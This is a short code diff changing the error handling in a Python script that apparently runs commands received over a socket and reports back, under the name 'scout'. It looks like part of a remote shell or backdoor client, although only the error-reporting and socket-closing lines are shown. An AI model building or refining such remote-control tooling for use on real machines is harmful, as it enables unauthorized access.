@@ -270,8 +270,13 @@ def main():
                 break
             except Exception as e:
                 try:
-                    s.sendall('[-]Error running command "' + command + '" : ' + str(e) + End)
+                    if command:
+                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
+                    else:
+                        s.sendall('[-]Error message : ' + str(e) + End)
                 except:
-                    s.sendall('[-]Error with scout : ' + str(e))
+                    s.shutdown(1)
+                    s.close()
+                    break
 
 main()
